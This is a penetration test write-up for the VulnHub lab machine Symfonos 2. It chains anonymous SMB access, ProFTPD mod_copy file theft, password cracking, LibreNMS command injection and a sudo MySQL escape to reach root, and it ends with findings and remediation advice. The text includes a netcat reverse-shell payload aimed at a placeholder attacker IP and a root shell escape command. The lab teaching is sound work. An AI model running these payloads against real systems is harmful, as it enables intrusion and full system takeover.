# Symfonos 2 — Penetration Testing Report

## 1. General Information

**Machine:** Symfonos 2  
**Platform:** VulnHub  
**Target IP:** `192.168.96.24`  
**Operating System:** Linux  
**Testing Type:** Black-box penetration testing  
**Objective:** Obtain initial access, escalate privileges, and achieve root-level access.

### Result 🎯

During the assessment, full control over the target system was successfully obtained:

```text
Network Discovery
       ↓
Port Enumeration
       ↓
SMB Anonymous Access
       ↓
Sensitive Backup File
       ↓
ProFTPD 1.3.5 mod_copy
       ↓
/etc/passwd + /etc/shadow
       ↓
Password Cracking
       ↓
SSH Access as aeolus
       ↓
Local Enumeration
       ↓
LibreNMS on localhost:8080
       ↓
SSH Local Port Forwarding
       ↓
LibreNMS 1.46 RCE
       ↓
Shell as cronus
       ↓
sudo -l
       ↓
NOPASSWD: /usr/bin/mysql
       ↓
MySQL → /bin/sh
       ↓
ROOT
```

---

# 2. Executive Summary

During the penetration test of **Symfonos 2**, a chain of vulnerabilities and configuration weaknesses was identified that ultimately allowed full compromise of the target system.

The initial port scan identified FTP, SSH, HTTP, and SMB services. The web service on port 80 did not expose an obvious attack vector, so the assessment was shifted toward SMB enumeration.

🔎 Anonymous access to an SMB share was discovered. The share contained a `backups` directory with a `log.txt` file containing sensitive information about the system configuration, including Samba and ProFTPD configuration data.

The ProFTPD configuration revealed the use of version `1.3.5`. Searching for known vulnerabilities identified **CVE-2015-3306**, a vulnerability in the `mod_copy` module that allows an unauthenticated remote attacker to copy arbitrary files using the `SITE CPFR` and `SITE CPTO` commands.

💥 Exploitation of this vulnerability allowed `/etc/passwd` and a backup copy of `/etc/shadow` to be obtained. The password hash belonging to the `aeolus` user was subsequently cracked using John the Ripper, resulting in valid credentials.

The credentials were used to obtain SSH access as `aeolus`.

Further local enumeration revealed MySQL and a web application running locally on port `8080`. The service was identified as LibreNMS and was not directly accessible from the attacking machine.

SSH Local Port Forwarding was therefore used to expose the local LibreNMS service to the attacker.

The LibreNMS version was identified as `1.46`. Vulnerability research revealed **CVE-2018-20434**, which allows remote command execution through the device creation functionality. NVD assigns this vulnerability a CVSS v3.0 score of **9.8 (Critical)**.

🐚 Instead of transferring and executing an exploit file on the target, the vulnerable device creation functionality was directly abused by creating a device containing a reverse shell command. This resulted in a shell as the `cronus` user.

The next privilege escalation stage was identified through `sudo -l`, which revealed:

```text
(root) NOPASSWD: /usr/bin/mysql
```

This configuration allowed the `cronus` user to execute MySQL as root. By abusing MySQL's shell execution functionality, a root shell was obtained:

```bash
sudo mysql -e '\! /bin/sh'
```

🎯 Full root-level access was successfully achieved and the flag was obtained from `/root`.

---

# 3. Scope

The assessment was performed against a single target:

|Parameter|Value|
|---|---|
|Target|Symfonos 2|
|IP|`192.168.96.24`|
|Network|`192.168.96.0/24`|
|Attacker|Kali Linux|
|Interface|`eth1`|

The assessment was performed in an isolated VulnHub laboratory environment.

---

# 4. Tools Used 🛠️

The following tools were used during the assessment:

- **arp-scan** — local network host discovery
    
- **Nmap** — port scanning and service/version enumeration
    
- **Gobuster** — web directory enumeration
    
- **WhatWeb** — web technology identification
    
- **smbclient** — SMB enumeration and interaction
    
- **Searchsploit** — vulnerability and exploit research
    
- **John the Ripper** — password hash cracking
    
- **wget** — file transfer
    
- **SSH** — remote access and local port forwarding
    
- **Dirb** — LibreNMS directory enumeration
    
- **LinPEAS** — local privilege enumeration
    
- **Netcat** — reverse shell handling
    
- **MySQL** — privilege escalation through an allowed sudo binary
    
- **GTFOBins** — identification of privilege escalation techniques
    

---

# 5. Reconnaissance 🔎

## 5.1 Host Discovery

The first step was to identify active hosts in the laboratory network.

`arp-scan` was used:

```bash
arp-scan -I eth1 192.168.96.0/24
```

The target host was identified:

```text
192.168.96.24
```

This IP address was selected as the primary target for further testing.

---

# 6. Port Enumeration

To obtain a complete view of the exposed attack surface, a full TCP scan was performed:

```bash
nmap -sV -A -p- 192.168.96.24
```

The following services were identified:

|Port|Service|Version|
|--:|---|---|
|21|FTP|ProFTPD 1.3.5|
|22|SSH|OpenSSH 7.4p1|
|80|HTTP|WebFS 1.21|
|139|NetBIOS/SMB|Samba|
|445|SMB|Samba 4.5.16-Debian|

### Initial Analysis

The most interesting attack surfaces were:

- FTP — known ProFTPD version
    
- HTTP — WebFS
    
- SMB — anonymous access
    
- SSH — potential access vector after obtaining credentials
    

At this stage, it was not possible to determine which service would provide the initial foothold, so further enumeration was performed against each relevant service.

---

# 7. HTTP Enumeration 🌐

## 7.1 Web Service Analysis

Port 80 hosted a simple web service:

```text
WebFS 1.21
```

Opening:

```text
http://192.168.96.24/
```

revealed a simple page containing an image.

The page source did not reveal an obvious attack vector.

---

## 7.2 Directory Enumeration

Gobuster was used to search for hidden directories:

```bash
gobuster dir -u http://192.168.96.24/ \
-w /usr/share/wordlists/dirb/common.txt
```

The result was:

```text
index.html (Status: 200)
```

No other interesting directories were discovered.

---

## 7.3 Technology Enumeration

WhatWeb was used to identify the web server and technologies:

```bash
whatweb http://192.168.96.24
```

Result:

```text
HTTPServer[webfs/1.21]
IP[192.168.96.24]
webfs[1.21]
```

The web service did not provide an obvious path to initial access.

### Conclusion

After several stages of web enumeration, no significant attack vector was identified.

Therefore, the focus was shifted to SMB.

---

# 8. SMB Enumeration 🔎

SMB appeared to be a more promising attack surface.

The available SMB resources were enumerated using:

```bash
smbclient -L //192.168.96.24
```

The following shares were identified:

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk
IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
```

The most interesting resource was:

```text
anonymous
```

The presence of an anonymous share indicated that SMB might be accessible without previously known credentials.

---

# 9. Anonymous SMB Access

The anonymous share was accessed using:

```bash
smbclient //192.168.96.24/anonymous -N
```

A directory named:

```text
backups
```

was discovered.

Inside the directory was:

```text
log.txt
```

The file was downloaded to the attacking machine:

```text
get log.txt
```

---

# 10. Analysis of `log.txt` 📄

The downloaded file became one of the most important findings at this stage.

It contained fragments of the system configuration.

One particularly interesting entry was:

```text
cat /etc/shadow > /var/backups/shadow.bak
```

This indicated that a backup copy of `/etc/shadow` existed at:

```text
/var/backups/shadow.bak
```

⚠️ This significantly changed the direction of the assessment.

The file also contained Samba configuration information:

```text
[anonymous]
   path = /home/aeolus/share
   browseable = yes
   read only = yes
   guest ok = yes
```

This confirmed that anonymous SMB access was intentionally enabled.

However, the ProFTPD configuration was even more interesting.

---

# 11. FTP Enumeration

Nmap had previously identified:

```text
21/tcp open ftp ProFTPD 1.3.5
```

Additional information was obtained from `log.txt`:

```text
ServerName "ProFTPD Default Installation"
ServerType standalone
Port 21

User aeolus
Group aeolus
```

The configuration also showed that anonymous FTP was configured, but write access was denied:

```text
<Limit WRITE>
  DenyAll
</Limit>
```

An anonymous FTP login was attempted.

However, the server returned:

```text
530 Login incorrect.
ftp: Login failed
```

Therefore, anonymous FTP access did not provide access to the FTP contents.

---

# 12. ProFTPD Vulnerability Research 🔎

Despite the failed anonymous FTP login, the identified version:

```text
ProFTPD 1.3.5
```

was potentially interesting.

Searchsploit was used to identify known vulnerabilities:

```bash
searchsploit ProFTPD 1.3.5
```

The following exploit was identified:

```text
ProFTPd 1.3.5 - File Copy
linux/remote/36742.txt
```

The vulnerability corresponds to:

**CVE-2015-3306**

The issue exists in the `mod_copy` module and allows an unauthenticated remote attacker to read and write arbitrary files using the `SITE CPFR` and `SITE CPTO` commands.

### CVSS

**CVE-2015-3306 — Critical**

CVSS v3.1:

```text
9.8 / 10.0
```

Vector:

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

---

# 13. Exploitation of ProFTPD `mod_copy` 💥

The identified exploit was used to abuse the ProFTPD file-copy functionality.

The targets were:

```text
/etc/passwd
```

and:

```text
/var/backups/shadow.bak
```

The contents of both files were successfully obtained on the attacking machine.

This was especially important because `shadow.bak` contained password hashes.

---

# 14. Password Cracking 🔐

After obtaining the files, the password hashes were extracted and analyzed.

The hash belonging to:

```text
aeolus
```

was passed to John the Ripper.

The `rockyou.txt` wordlist was used:

```text
rockyou.txt
```

The password was successfully recovered.

This resulted in valid credentials:

```text
Username: aeolus
Password: [redacted]
```

---

# 15. Initial Access — SSH 🚪

The recovered credentials were used to authenticate to SSH:

```bash
ssh aeolus@192.168.96.24
```

A shell was obtained as:

```text
aeolus
```

🎯 At this point, initial access to the target system had been successfully established.

---

# 16. Local Enumeration 🔎

After obtaining a shell, standard local enumeration was performed.

The following commands were used:

```bash
id
whoami
pwd
hostname
uname -a
sudo -l
```

No obvious direct path to root was identified at this stage.

Therefore, deeper local enumeration was performed.

---

# 17. LinPEAS

**LinPEAS** was used for automated local privilege and system enumeration.

The results revealed several locally running services.

The most interesting findings were:

```text
MySQL
```

and:

```text
Apache / LibreNMS
```

The following Apache configuration file was also identified:

```text
/etc/apache2/sites-enabled/librenms.conf
```

This indicated the presence of LibreNMS, which was not exposed directly through the external network interface.

---

# 18. Local Service Enumeration

Further analysis identified a web service listening on:

```text
127.0.0.1:8080
```

Because the service was only accessible locally, it could not be accessed directly from the attacking machine.

This provided a reason to use SSH tunneling.

---

# 19. SSH Local Port Forwarding 🔀

An SSH tunnel was created:

```bash
ssh aeolus@192.168.96.24 -L 8080:127.0.0.1:8080
```

The local port:

```text
127.0.0.1:8080
```

on the attacking machine was forwarded to:

```text
127.0.0.1:8080
```

on the target.

This made the previously inaccessible internal service available for analysis from Kali.

---

# 20. LibreNMS Enumeration

After opening:

```text
http://127.0.0.1:8080/
```

the following application was identified:

```text
LibreNMS
```

Dirb was used for additional directory enumeration:

```bash
dirb http://127.0.0.1:8080/
```

No obvious additional entry points were discovered.

The next step was to identify the LibreNMS version and search for known vulnerabilities.

---

# 21. Vulnerability Research — LibreNMS 🔎

Searchsploit was used to search for known LibreNMS vulnerabilities:

```bash
searchsploit LibreNMS
```

The following exploit was identified:

```text
LibreNMS 1.46 - 'addhost' Remote Code Execution
```

Exploit-DB:

```text
EDB-ID: 47044
CVE: CVE-2018-20434
```

The vulnerability allows arbitrary operating system command execution through the device creation functionality.

### CVSS

**CVE-2018-20434**

```text
CVSS 3.0: 9.8
Severity: Critical
```

Vector:

```text
CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

---

# 22. Exploitation of LibreNMS 💥

After identifying LibreNMS 1.46, the vulnerability was exploited through the device creation functionality.

The identified vulnerability was:

```text
LibreNMS 1.46 - 'addhost' Remote Code Execution
Exploit-DB: 47044
CVE: CVE-2018-20434
```

The vulnerable functionality allows commands supplied through the affected parameter to be executed by the application.

### Reverse Shell Preparation 🐚

Instead of transferring the exploit file to the target machine, I directly used the LibreNMS web interface to trigger the vulnerability.

A reverse shell payload was prepared:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} {LISTENING_PORT} >/tmp/f
```

On the Kali Linux attacker machine, Netcat was started in listening mode:

```bash
nc -lvnp {LISTENING_PORT}
```

### Creating the Device

In the LibreNMS web interface, I created a new device.

The parameter processed by the vulnerable functionality was supplied with the reverse shell command:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} {LISTENING_PORT} >/tmp/f
```

After creating the device, LibreNMS processed the supplied value and executed the command.

A reverse shell was received on the Kali machine:

```text
connect to [{ATTACKER_IP}] from (UNKNOWN) [{TARGET_IP}]
```

The current user was verified:

```bash
whoami
```

Result:

```text
cronus
```

🎯 Successful exploitation of the LibreNMS vulnerability therefore resulted in command execution and a shell as the `cronus` user.

### Exploitation Through the Service

The vulnerable device was processed by the LibreNMS service, which caused the supplied command to execute on the target.

This allowed the reverse shell payload to run without manually transferring an exploit file to the target.

The resulting attack path was:

```text
LibreNMS 1.46
       ↓
CVE-2018-20434
       ↓
Create malicious device
       ↓
Command execution
       ↓
Reverse Shell
       ↓
cronus
```

At this point, the next objective was to stabilize the shell and enumerate the privileges available to `cronus`.

---

# 23. Shell Stabilization 🐚

For more convenient interaction with the target, the shell was upgraded using Python:

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

After stabilizing the shell, the current user and available privileges were checked again:

```bash
id
whoami
pwd
sudo -l
```

---

# 24. Privilege Escalation 🔥

The key finding was obtained using:

```bash
sudo -l
```

The output showed:

```text
(root) NOPASSWD: /usr/bin/mysql
```

This meant that the `cronus` user could execute MySQL as root without entering a password.

⚠️ This represented a serious privilege-control misconfiguration.

---

# 25. Root Privilege Escalation via MySQL 👑

MySQL provides the ability to execute shell commands through the `\!` command.

The following command was used:

```bash
sudo mysql -e '\! /bin/sh'
```

Because MySQL was executed with root privileges, the resulting shell also inherited root privileges.

The privileges were verified with:

```bash
id
```

The result confirmed root-level privileges.

The escalation path was therefore:

```text
cronus
   ↓
sudo /usr/bin/mysql
   ↓
MySQL running as root
   ↓
\! /bin/sh
   ↓
root
```

🎯 Full root access was successfully obtained.

---

# 26. Flag 🏁

After obtaining root access, the `/root` directory was inspected:

```bash
cd /root
ls
```

A flag file was found inside the `/root` directory.

At this point, the target system had been fully compromised.

---

# 27. Attack Chain 🔥

The complete attack chain was:

```text
192.168.96.24
      │
      ├── 21/tcp — ProFTPD 1.3.5
      ├── 22/tcp — SSH
      ├── 80/tcp — WebFS
      ├── 139/tcp — SMB
      └── 445/tcp — SMB
                   │
                   ▼
           Anonymous SMB Access
                   │
                   ▼
              backups/log.txt
                   │
                   ├── ProFTPD configuration
                   └── shadow.bak reference
                   │
                   ▼
          ProFTPD 1.3.5 mod_copy
                   │
                   ▼
             CVE-2015-3306
                   │
                   ▼
           /etc/passwd + shadow.bak
                   │
                   ▼
             John the Ripper
                   │
                   ▼
             aeolus credentials
                   │
                   ▼
                  SSH
                   │
                   ▼
                 aeolus
                   │
                   ▼
                LinPEAS
                   │
                   ▼
         localhost:8080 LibreNMS
                   │
                   ▼
          SSH Port Forwarding
                   │
                   ▼
             LibreNMS 1.46
                   │
                   ▼
             CVE-2018-20434
                   │
                   ▼
                 cronus
                   │
                   ▼
                sudo -l
                   │
                   ▼
        NOPASSWD: /usr/bin/mysql
                   │
                   ▼
              sudo mysql
                   │
                   ▼
                /bin/sh
                   │
                   ▼
                 ROOT
```

---

# 28. Findings ⚠️

## Finding 1 — Anonymous SMB Share Exposes Sensitive Backup Data

**Severity:** High

### Description

SMB provided anonymous access to:

```text
\\192.168.96.24\anonymous
```

The share contained a `backups` directory with the `log.txt` file.

The file contained sensitive technical information about the system, including information related to `/etc/shadow` backups and service configurations.

### Impact

An unauthenticated attacker could obtain internal technical information that could be used to support further attacks against the system.

### Recommendation

- Disable anonymous SMB access.
    
- Restrict SMB access according to the principle of least privilege.
    
- Do not store configuration files or sensitive backups in publicly accessible SMB shares.
    
- Regularly review the contents of accessible SMB resources.
    

---

# Finding 2 — ProFTPD 1.3.5 `mod_copy` Arbitrary File Read/Write

**Severity:** Critical

**CVSS 3.1:** **9.8**

**CVE:** CVE-2015-3306

### Description

The installed version of ProFTPD contained a vulnerability in the `mod_copy` module that allowed an unauthenticated remote attacker to read and write arbitrary files using the `SITE CPFR` and `SITE CPTO` commands.

### Impact

During testing, exploitation allowed the following files to be obtained:

```text
/etc/passwd
/var/backups/shadow.bak
```

The password hashes obtained from the shadow backup were subsequently used to compromise the `aeolus` account.

### Recommendation

Upgrade ProFTPD to a patched version and disable `mod_copy` if its functionality is not required.

---

# Finding 3 — LibreNMS 1.46 Remote Code Execution

**Severity:** Critical

**CVSS 3.0:** **9.8**

**CVE:** CVE-2018-20434

### Description

LibreNMS 1.46 was affected by a vulnerability that allowed operating system commands to be executed through the device creation functionality.

### Impact

During testing, the vulnerability was exploited by creating a device containing a reverse shell payload.

The resulting shell was obtained as:

```text
cronus
```

This provided command execution on the target system and enabled the privilege escalation stage that followed.

### Recommendation

- Upgrade LibreNMS to a version containing the security fix.
    
- Restrict access to the LibreNMS administrative interface.
    
- Do not expose the management interface to untrusted networks.
    
- Use MFA where supported.
    
- Monitor and patch vulnerable application versions regularly.
    

---

# Finding 4 — Excessive Sudo Privileges for MySQL

**Severity:** Critical

### Description

The `cronus` user had the following sudo permission:

```text
(root) NOPASSWD: /usr/bin/mysql
```

This allowed MySQL to be executed with root privileges:

```bash
sudo mysql -e '\! /bin/sh'
```

The MySQL shell functionality could then be abused to obtain a root shell.

### Impact

Any attacker who obtained access to the `cronus` account could escalate privileges to root and gain complete control over the operating system.

### Recommendation

Remove the unnecessary sudo rule from `/etc/sudoers`.

If MySQL must be executed with elevated privileges:

- Restrict the allowed command arguments as much as possible.
    
- Use a dedicated administrative procedure.
    
- Do not allow users to launch an interactive MySQL session as root.
    
- Apply the principle of least privilege.
    

---

# 29. Risk Assessment 📊

|ID|Finding|Severity|CVSS|
|---|---|---|--:|
|F-01|Anonymous SMB + Sensitive Backup Data|High|—|
|F-02|ProFTPD `mod_copy` Arbitrary File Read/Write|Critical|9.8|
|F-03|LibreNMS 1.46 RCE|Critical|9.8|
|F-04|Excessive sudo privileges for MySQL|Critical|—|

### Overall Risk

**CRITICAL**

The critical risk level is primarily caused by the ability to combine several weaknesses into a complete compromise chain:

```text
Unauthenticated SMB
        ↓
Sensitive Information
        ↓
ProFTPD Arbitrary File Read
        ↓
Credential Compromise
        ↓
SSH Access
        ↓
Local Service Discovery
        ↓
LibreNMS RCE
        ↓
cronus
        ↓
Sudo Misconfiguration
        ↓
ROOT
```

As a result, an attacker could progress from unauthenticated network access to complete control over the operating system.

---

# 30. Recommendations 🛡️

### Critical Priority

1. Upgrade ProFTPD and remediate CVE-2015-3306.
    
2. Upgrade LibreNMS to a version containing the fix for CVE-2018-20434.
    
3. Remove the `NOPASSWD` rule for `/usr/bin/mysql`.
    
4. Restrict administrative services from untrusted networks.
    

### High Priority

5. Disable anonymous SMB access.
    
6. Remove sensitive backup files from accessible SMB shares.
    
7. Do not store copies of `/etc/shadow` in directories accessible to service accounts.
    
8. Regularly perform network and local vulnerability assessments.
    

### Additional Measures

9. Apply the principle of least privilege.
    
10. Separate permissions between service accounts.
    
11. Restrict internal services using firewall rules.
    
12. Monitor unusual use of FTP `SITE CPFR` / `SITE CPTO` commands.
    
13. Monitor execution of administrative binaries through `sudo`.
    
14. Regularly update outdated system and application software.
    

---

# 31. Lessons Learned 🧠

The most important lesson from this machine was that successful exploitation did not depend on finding a single vulnerability.

Instead, the compromise resulted from **systematic enumeration and connecting individual findings together**.

Initially, the HTTP service did not provide a useful direction. Rather than spending excessive time enumerating a service that was not producing meaningful results, the focus was shifted to SMB after anonymous access was discovered.

The `log.txt` file then became a critical source of information. It demonstrated how exposed backups and configuration information can significantly simplify further exploitation.

The most useful methodology was:

```text
Service Version
      ↓
Configuration
      ↓
Known Vulnerability Research
      ↓
Exploit Validation
```

After obtaining SSH access, the same approach was applied locally:

```text
Compromised User
      ↓
Local Enumeration
      ↓
Unknown Localhost Service
      ↓
SSH Tunneling
      ↓
Application Identification
      ↓
CVE Research
      ↓
RCE
```

The final stage also demonstrated the importance of checking `sudo -l`.

Even when no obvious SUID binaries or kernel exploits are present, an incorrectly configured sudo rule can provide a direct path to root.

💡 The main takeaway from this machine was the importance of **following the information obtained during enumeration instead of blindly running tools**.

---

# 32. Conclusion 🎯

The **Symfonos 2** machine was successfully fully compromised.

The initial attack path started with an anonymous SMB share, which exposed configuration information through the `log.txt` file. Analysis of this information led to the discovery of ProFTPD 1.3.5 and the vulnerable `mod_copy` module.

Exploitation of **CVE-2015-3306** allowed system files containing password hashes to be obtained. After cracking the password, SSH access was obtained as the `aeolus` user.

Further local enumeration revealed an internally accessible LibreNMS service. SSH Local Port Forwarding was used to expose the service to the attacking machine.

LibreNMS 1.46 was then identified as vulnerable to **CVE-2018-20434**. Instead of transferring an exploit file, the vulnerable device creation functionality was directly abused by creating a device containing a reverse shell payload.

🐚 This resulted in a shell as the `cronus` user.

The final privilege escalation stage was based on the following sudo configuration:

```text
(root) NOPASSWD: /usr/bin/mysql
```

By executing MySQL as root and abusing its shell execution functionality, full root access was obtained.

The complete compromise chain was therefore:

```text
Anonymous SMB
      ↓
Sensitive Configuration
      ↓
ProFTPD mod_copy
      ↓
CVE-2015-3306
      ↓
Password Hashes
      ↓
aeolus
      ↓
SSH
      ↓
Local Enumeration
      ↓
LibreNMS
      ↓
CVE-2018-20434
      ↓
cronus
      ↓
sudo MySQL
      ↓
ROOT 👑
```

**Final Result: ROOT ACCESS + FLAG 🏁**